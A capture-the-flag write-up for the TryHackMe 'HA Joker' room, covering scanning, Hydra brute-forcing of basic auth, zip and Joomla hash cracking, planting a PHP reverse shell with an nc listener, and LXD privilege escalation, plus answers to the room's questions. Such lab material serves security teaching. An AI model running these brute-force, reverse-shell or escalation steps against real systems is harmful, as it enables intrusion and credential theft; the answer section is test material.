# HA Joker CTF
###### tags: `OSCP` `THM`

![Joker CTF THM room](https://tryhackme-images.s3.amazonaws.com/room-icons/ed910d9d7c419b8266128e044a40c7e2.jpeg)

[Play](https://tryhackme.com/room/jokerctf)


## 1. Scanning & Enumeration
We do the below scans in parallel.

### 1.1. Port Scanning
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
|_  256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: Joker
8080/tcp open  http    Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Port 8080 looks out of place, and wants a password.

### 1.2. Web Enumeration
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.183.215 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html,txt' 
/img                  (Status: 301) [Size: 312] [--> http://10.10.183.215/img/]
/css                  (Status: 301) [Size: 312] [--> http://10.10.183.215/css/]
/secret.txt           (Status: 200) [Size: 320]                                
/server-status        (Status: 403) [Size: 278]                                
```                       
Only one file that pops out to us.

### 1.3. Web Exploration
`/secret.txt` on port 80 suggest a possible user.

Port 8080 gives us a login form, http-get. We can try brute-forcing it using Hydra.

### 1.4. Password Bruteforcing: Hydra
```
┌──(kali㉿kali)-[~]
└─$ hydra 10.10.183.215 -s 8080 -l {username} -P /usr/share/wordlists/rockyou.txt http-get
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-03 03:13:22
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.183.215:8080/
[STATUS] 1174.00 tries/min, 1174 tries in 00:01h, 14343225 to do in 203:38h, 16 active
[8080][http-get] host: 10.10.183.215   login: {username}   password: {password}
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-03 03:14:34
```

Now, we can login on the port 8080 using these credentials.

### 1.5. Web Exploration (Again)
![port 8080 Joomla CMS website homepage](https://i.imgur.com/2Dnes6f.jpg)

I did not know Joker is a Joomla fan. We check the `robots.txt` file as usual, and we get the directory structure of Joomla. 
```
User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```
Let's go to `/administrator/`. I explore how to get the password in the next sections.
![Administrator page in Joomla](https://i.imgur.com/HNr1dh0.png)

### 1.6. Web Enumeration (Again)
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.183.215:8080/ -U {username} -P {password} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html,txt' -t 108 -q
/templates            (Status: 301) [Size: 325] [--> http://10.10.183.215:8080/templates/]
/modules              (Status: 301) [Size: 323] [--> http://10.10.183.215:8080/modules/]  
/bin                  (Status: 301) [Size: 319] [--> http://10.10.183.215:8080/bin/]      
/plugins              (Status: 301) [Size: 323] [--> http://10.10.183.215:8080/plugins/]  
/README               (Status: 200) [Size: 4494]                                          
/README.txt           (Status: 200) [Size: 4494]                                          
/cache                (Status: 301) [Size: 321] [--> http://10.10.183.215:8080/cache/]    
/components           (Status: 301) [Size: 326] [--> http://10.10.183.215:8080/components/]
/robots               (Status: 200) [Size: 836]                                            
/robots.txt           (Status: 200) [Size: 836]                                            
/LICENSE.txt          (Status: 200) [Size: 18092]                                          
/LICENSE              (Status: 200) [Size: 18092]                                          
/administrator        (Status: 301) [Size: 329] [--> http://10.10.183.215:8080/administrator/]
/configuration.php    (Status: 200) [Size: 0] 
```

Nothing that we don't know. How about `nikto` to find more interesting things?

```
┌──(kali㉿kali)-[~]
└─$ nikto -h http://10.10.173.69:8080/ -id {username}:{password}
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.173.69
+ Target Hostname:    10.10.173.69
+ Target Port:        8080
+ Start Time:         2021-06-03 03:49:05 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ / - Requires Authentication for realm ' Please enter the password.'
+ Successfully authenticated to realm ' Please enter the password.' with user-supplied credentials.
+ Entry '/administrator/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/bin/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/cache/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/cli/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/components/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/includes/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/language/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/layouts/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/libraries/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/modules/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/plugins/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/tmp/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 14 entries which should be manually viewed.
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ /backup.zip: Potentially interesting archive/cert file found.
+ /backup.zip: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ Uncommon header 'tcn' found, with contents: choice
+ OSVDB-3092: /web.config: ASP config file is accessible.
```

Ooh! `backup.zip` looks interesting. Let's explore it deeper.

### 1.7. Zip Cracking
```
┌──(kali㉿kali)-[/tmp]
└─$ unzip backup.zip
Archive:  backup.zip
[backup.zip] db/joomladb.sql password: 
```
Nothing is obvious as to what could be the password. I'll use john. 

Wait how? 

1. Using `zip2john`, we can get the hash: `zip2john backup.zip > hash `
2. Then, do `john hash` and there you go!

### 1.8. Logging In
Recall we saw `db/joomladb.sql` file above. In it, I found:

```
LOCK TABLES `cc1gr_users` WRITE;
/*!40000 ALTER TABLE `cc1gr_users` DISABLE KEYS */;
INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com',{hash was here, but it passed away :( },0,1,'2019-10-08 12:00:15','2019-10-25 15:20:02','0','{\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"helpsite\":\"\",\"timezone\":\"\"}','0000-00-00 00:00:00',0,'','',0);
/*!40000 ALTER TABLE `cc1gr_users` ENABLE KEYS */;
UNLOCK TABLES;
```

Again, we use `john` to crack.

![Control Panel for Joomla CMS](https://i.imgur.com/Tlv0LBQ.png)


## 2. Foothold

![error.php page in Joomla page](https://i.imgur.com/lmsDNof.png)
`error.php` Didnt work as it does in WordPress. So, I put the reverse shell in `index.php`. 

I used [Reverse Shell Generator](https://www.revshells.com/) to get the PHP reverse shell.


```
┌──(kali㉿kali)-[~/Desktop/tools/files]
└─$ nc -lnvp 443  
listening on [any] 443 ...
connect to [10.17.8.184] from (UNKNOWN) [10.10.173.69] 51608
Linux ubuntu 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 01:02:25 up 16 min,  0 users,  load average: 0.00, 0.09, 0.22
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
sh: 0: can't access tty; job control turned off
$ whoami
www-data

```
We are in!

## 3. PrivEsc
[This article](https://www.hackingarticles.in/lxd-privilege-escalation/) is **very** interesting and detailed, listing each and every stage of the epxloit.

After getting the alpine file in the system using python http server, we do the following.
(If you are stuck in the python3 server setup, feel free to lookup other of my writeups.)

```
www-data@ubuntu:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210603_0407.tar.gz  --alias myimage
<-v3.13-x86_64-20210603_0407.tar.gz  --alias myimage
www-data@ubuntu:/tmp$ lxc image list
lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| myimage | 1e7c4197270d | no     | alpine v3.13 (20210603_04:07) | x86_64 | 3.10MB | Jun 3, 2021 at 8:11am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
www-data@ubuntu:/tmp$ 
```

Continuing the exploit further,
```
/mnt/root/root # ^[[31;18Rcat {file name}.{extension}
cat final.txt

     ██╗ ██████╗ ██╗  ██╗███████╗██████╗ 
     ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
     ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
╚█████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                         
!! Congrats you have finished this task !!

Contact us here:

Hacking Articles : https://twitter.com/rajchandel/
Aarti Singh: https://in.linkedin.com/in/aarti-singh-353698114

+-+-+-+-+-+ +-+-+-+-+-+-+-+
 |E|n|j|o|y| |H|A|C|K|I|N|G|
 +-+-+-+-+-+ +-+-+-+-+-+-+-+
```


## 4. Room Specific Questions

#### What version of Apache is it?
Check the nmap scan results above in section 1.

#### What port on this machine not need to be authenticated by user and password?
8080 asks for password, the other does not.

#### There is a file on this port that seems to be secret, what is it?
Check the results of the web enumeration scan in section 1. 

#### When reading the secret file, We find with a conversation that seems contains at least two users and some keywords that can be intersting, what user do you think it is?
The name of this room is based upon?

#### What port on this machine need to be authenticated by Basic Authentication Mechanism?
Nmap scan results show another port besides 80.

#### At this point we have one user and a url that needs to be aunthenticated, brute force it to get the password, what is that password?
Crack the password using hydra!

#### Yeah!! We got the user and password and we see a cms based blog. Now check for directories and files in this port. What directory looks like as admin directory?
Check the gobuster scan results.

#### We need access to the administration of the site in order to get a shell, there is a backup file, What is this file?
Nikto scan results

#### We have the backup file and now we should look for some information, for example database, configuration files, etc ... But the backup file seems to be encrypted. What is the password?
zip2john + john

#### Remember that... We need access to the administration of the site... Blah blah blah. In our new discovery we see some files that have compromising information, maybe db? ok what if we do a restoration of the database! Some tables must have something like user_table! What is the super duper user?
Check the SQL file dump

#### Super Duper User! What is the password?
Check the SQL file dump + john (again)

#### At this point, you should be upload a reverse-shell in order to gain shell access. What is the owner of this session?
Check the user in the code snippets pasted in Section 2. Foothold :)

#### This user belongs to a group that differs on your own group, What is this group?
Check the `id` command once you are in the system.

#### Spawn a tty shell.
Easiest way is `bash -i`, but python3 shells work better for me. Use `python3 -c 'import pty; pty. spawn("/bin/bash")'` to get a TTY shell.

#### In this question you should be do a basic research on how linux containers (LXD) work, it has a small online tutorial. Googling "lxd try it online".
We use [this link](https://www.hackingarticles.in/lxd-privilege-escalation/).

#### Research how to escalate privileges using LXD permissions and check to see if there are any images available on the box.
The link above does the job.

#### The idea here is to mount the root of the OS file system on the container, this should give us access to the root directory. Create the container with the privilege true and mount the root file system on /mnt in order to gain access to /root directory on host machine.
Check the steps done above in section 3. PrivEsc

#### What is the name of the file in the /root directory?
:)
